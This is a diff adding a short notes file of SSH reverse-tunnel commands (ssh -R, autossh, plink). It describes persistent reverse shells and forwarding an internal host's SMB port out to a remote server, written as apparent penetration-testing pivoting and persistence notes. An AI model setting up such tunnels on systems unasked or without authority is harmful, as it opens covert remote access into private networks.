@@ -1,0 +1,53 @@
+ssh -f -N -R 10000:localhost:22 user@server
+- Set port 10000 on remote server and map it to port 22 on this local machine
+
+-N
+Do not execute a remote command, useful for just forwarding
+
+-f
+Requests ssh to go to background just before command execution. Useful if ssh is going to ask for 
+passwords or passphrases but you don't want the user to see it
+
+-R [bind_address:]port:host:hostport
+Specifies that the given port on the remote server/host is to be forwarded to the given host and port on the local side. Port 10000 on remote machine will map back to port 22 on the local machine
+
+ssh -f -N -R 10001:10.0.2.3:445 user@server
+- Set port 10001 on remote server to ip address port 445
+
+ssh -f -N -R 10001:10.0.2.3:455 -R 10000:localhost:22 user@server
+- Note you can also chain the -R command
+
+###########################
+
+Generate SSH Key
+
+ssh-keygen -t rsa
+
+# Copy the generated key to the remote machine.
+ssh-copy-id -l /root/.ssh/id_rsa.pub -p 2222 user@server
+
+# Use autossh to make a reverse shell persistant
+autossh -M 10984 -N -f -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i /root/.ssh/syspub -R 8888:localhost:22 user@server -p 2222 &
+
+-i /root/.ssh/syspub
+# Location of ssh key
+-M is for monitoring port
+-o "PubkeyAuthentication=yes"
+# Use public key authentication
+-o "PasswordAuthentication=no"
+# Do not ask for password
+
+###########################
+
+SSH reverse tunnel on Windows using plink
+
+C:\>plink -P 22 -l username -pw password -C -R 5900:127.0.0.1:5900
+
+-P # ssh server port
+-l # ssh login name
+-pw # ssh server password
+-C # enable compression
+-R # forward remote port to local address
+
+MyEnTunnel
+- Like autossh allows persistence but requires install and has a system tra
